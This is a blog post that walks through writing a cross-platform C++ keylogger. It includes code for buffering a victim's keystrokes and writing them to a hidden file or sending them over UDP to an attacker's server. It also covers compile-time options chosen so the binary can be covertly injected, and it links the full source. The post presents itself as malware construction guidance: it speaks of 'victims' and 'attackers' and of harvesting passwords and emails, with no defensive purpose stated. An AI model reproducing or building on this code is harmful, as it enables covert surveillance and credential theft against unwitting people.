---
title: "keylogger: A Cross-Platform Keylogger"
date: 2023-11-13T11:04:37-08:00
description: "How to write a cross platform keylogger."
tags: ["cli-tools", "c++", "linux", "windows", "x11"]
---

While developing the `kbhell`[^1] application, I realized I was about 90% of the
way to writing a keylogger. I decided to finish the job off and write a proper,
cross platform keylogger that would capture the victim's every keystroke.

# THE REQUIREMENTS

So there's the very obvious requirement of capturing user keystrokes. That said,
once you think about the fact that keyboards have different layouts, there are
different language sets, etc., it's suddenly not so simple to define what it is
we're recording.

Another interesting issue that comes up is how do you record the keystrokes? You
could write it to a hidden file on the victim's PC. Yeah that works but then
you'd need a way of getting that file off the PC. Another idea is to transmit
the data over the network. If sending data over the network, what should trigger
packet transmission? Do you send when you hit some packet size threshold or do
you send data at a fixed frequency?

I settled on the following requirements:

1. The keylogger shall record user keypresses that correspond to printable
   characters as defined by the currently installed C locale.
2. The keylogger shall support recording to a plaintext file on the victim PC.
3. The keylogger shall support recording to a UDP socket.
4. The keylogger recording mode shall be configurable.
5. The keylogger shall allow the user to control the frequency of recording via
   a configurable keypress limit switch.

In the next few sections, we'll look at these requirements in more detail and
discuss their implementation.

# CAPTURING KEYPRESSES

I won't dwell on this topic too long since it is already explained with code
samples in the "Keyboard Hell"[^1] article. The basic idea is that we can use
the X11 event system on Linux and global hooks on Windows to intercept
keystrokes without any noticeable effect on the rest of the system. 

The same code that was employed in `kbhell` was used in `keylogger`'s
implementation. The only difference is that instead of playing a sound bite on
every keypress, we are pushing characters to a recorder object's character
buffer. Only printable characters as defined by `std::isprint`[^2] are
recorded. The latter detail is limiting in that we won't be able to completely
playback the victim's key history. That said, we can still analyze the output to
find password, emails, usernames, etc.

# RECORDING MODES

Based on our initial requirements, we want to support two recording modes: text
and network. Text mode captures character data to a plaintext file on the
victim's PC. Network mode transmits the character data over the network as UDP
packets from the victim PC to the attacker's server. 

Each mode is implemented as a recorder type object implementing the `Recorder`
interface:

```cpp
/*!
 * \class Recorder
 * \brief Recorder defines an interface for buffering and transmitting user
 *        keystrokes.
 */
class Recorder {
 public:
  /*!
   * \brief Construct a recorder object with a key limit of \p key_limit.
   * \param key_limit The maximum number of keys the recorder will store in
   *                  memory.
   * \throws std::runtime_error When given a zero or negative \p key_limit
   *                            value.
   */
  explicit Recorder(int key_limit);

  Recorder() = delete;
  virtual ~Recorder() = default;
  Recorder(const Recorder&) = default;
  Recorder& operator=(const Recorder&) = default;
  Recorder(Recorder&&) = default;
  Recorder& operator=(Recorder&&) = default;

  /*!
   * \brief Buffer the char \p character in memory.
   * \details Characters are buffered in memory. If the buffer limit has been
   *          reached, the buffer will be emptied via a call to Transmit() and
   *          then \p character will be added to the buffer.
   * \param character A printable character as classified by the currently
   *                  installed C locale.
   * \throws std::runtime_error When BufferKeyPress() must call Transmit() to
   *                            make room for \p character in the buffer but
   *                            Transmit() fails.
   */
  void BufferKeyPress(char character);

  /*!
   * \brief Transmit keystroke buffer contents to the recording medium.
   */
  virtual void Transmit() = 0;

 protected:
  using CharList = std::vector<char>;

  int num_keys_;  /**< Number of keystrokes currently buffered. */
  CharList keys_; /**< Keystroke char buffer. */
};
```

`Recorder` types all maintain a fixed sized `char` buffer called `keys_`. On
construction, the user specifies the size of the buffer via the `key_limit`
constructor parameter. The user can add characters to the buffer via the
`BufferKeyPress()` method. `BufferKeyPress()` implements a policy where if a
character to be buffered cannot be accomodated, then the buffer is emptied via a
call to `Transmit()` before the character is inserted into the buffer.
`Transmit()` is a method implemented by all recorder types that implements the
writing of buffered data to some recording medium (e.g., a text file or a
socket).

As you might have guessed by now, each recording mode has an associated
`Recorder` subtype. The text file recorder has the `FileRecorder` type and the
UDP recorder has the `NetworkRecorder` type. Below is the implementation of the
text and network recorders' `Transmit()` method.

```cpp
void FileRecorder::Transmit() {
  if (!num_keys_) {
    return;
  }

  /* We open and close the log file everytime Transmit() is called because we
   * want to ensure in the case the program is stopped abruptly, we will have a
   * chance at saving some keystroke data. */
  std::ofstream log_handle(log_path_.c_str(), std::ios_base::app);
  if (!log_handle) {
    throw std::runtime_error("unable to open key log file");
  }
  log_handle.write(keys_.data(), num_keys_);
  num_keys_ = 0;
}

void NetworkRecorder::Transmit() {
  if (!num_keys_) {
    return;
  }

  int bytes_sent = tx_socket_.Send(keys_.data(), num_keys_);
  if (bytes_sent != num_keys_) {
    std::cerr << "warning: only" << bytes_sent << "/" << num_keys_
              << "bytes sent" << std::endl;
  }
  num_keys_ = 0;
}
```

You'll notice that `FileRecorder::Transmit()` opens and closes the file handle
each time its called. Not the most efficient method of performing file IO.
However, the comment in the code explains the reasoning. If the keylogger is
suddently halted, there's no guaranteee that the data sent via the stream will
have been flushed to the file. Explicitly closing the file handle flushes the
stream contents. In retrospect, this would have been a good use case for using
`std::ostream::flush`[^3].

The `NetworkRecorder` uses a wrapper around a Linux/Windows UDP socket to
transmit data. You can look at the UDP wrapper source[^4] to get the full
details.

# CONFIGURATION

My first thought when it came to configuration was to just pass in commandline
args as usual. However, when you think about the deployment use cases for a
keylogger, having to inject your keylogger's binary plus a bunch of CLI args
doesn't sound very appealing. As a result, I went with making `keylogger`
compile time configurable. The configuration options are shown in the main
program snippet below:

```cpp
enum RecorderType {
  kText = 0, /* Record to text file. */
  kNetwork,  /* Record to UDP socket. */
};

/* These are essentially your program options. You want to build your options
 * into the executable to make deployment of the keylogger easier down the line
 * (i.e., you don't want to have to sneakily deploy/inject the keylogger
 * executable AND a bunch of CLI options). */

/* Recording medium. */
#define RECORDER_TYPE RecorderType::kText
/* Max number of keystrokes buffered in memory before the data is written to the
 * recorder. */
#define RECORDER_KEY_LIMIT 8
/* Keystroke log file (RecorderType::kText only). */
#define RECORDER_FILE_PATH "/home/ieg/dev/keylogger/bin/keys.txt"
/* UDP socket IPv4 address and port of the remote server collecting keystroke
 * data (RecorderType::kNetwork only). */
#define RECORDER_IP "127.0.0.1"
#define RECORDER_PORT 5555
```

The keylogger user can select their recording mode and then set options specific
to that mode. One can edit the `keylogger.cpp` file directly or pass the
relevant options to the compiler (e.g., `-DRECORDER_KEY_LIMIT=256`).

Regardless of the mode selected, the `RECORDER_KEY_LIMIT` option must always be
set. `RECORDER_KEY_LIMIT` controls how many keypresses are buffered prior to
transmission. A value for `RECORDER_KEY_LIMIT` must be carefully selected. Set
this value too low and the keylogger might be a bit too noisey (i.e., produce a
lot of net traffic or disk IO overhead). Set it too high and you won't see
potentially any data transmitted. The sweet spot is upto the attacker to decide.

# CONCLUSION

Below is a demo showing `keylogger` in action on a Linux system.

{{< video src="/posts/keylogger/keylogger-demo.mp4" type="video/mp4" preload="auto" >}}

I've included a script, `key_capture.py`, that prints captured key data from a
remote keylogger running in network mode. You can see that script in action
during the demo as it captures my keypresses in the NeoVim editor.

The toughest part of developing the keylogger is by far the capture of global
keypresses which is highly dependent on the OS and display technology in use.
Beyond that, the choices you are left with are how and when to log keypresses.
While I don't have plans to deploy my keylogger in the wild anytime soon, it has
been fun running the tool on my own PC and looking back at some of the silly
searches and things I type into my computer.

You can find the complete project source with build instructions, usage, etc. on
my GitHub page under [keylogger][7].


[1]: https://programmador.com/posts/keyboard-hell/
[2]: https://en.cppreference.com/w/cpp/string/byte/isprint
[3]: https://en.cppreference.com/w/cpp/io/basic_ostream/flush
[4]: https://github.com/ivan-guerra/keylogger/blob/master/include/io/udp/udp_socket.h
[5]: https://github.com/ivan-guerra/keylogger/blob/master/src/io/udp/linux_udp_socket.cpp
[6]: https://github.com/ivan-guerra/keylogger/blob/master/src/io/udp/windows_udp_socket.cpp
[7]: https://github.com/ivan-guerra/keylogger.git

[^1]: [Keyboard Hell][1]
[^2]: [`std::isprint`][2]
[^3]: [`std::ostream::flush`][3]
[^4]: [udp_socket.h][4], [linux_udp_socket.cpp][5], [windows_udp_socket.cpp][6]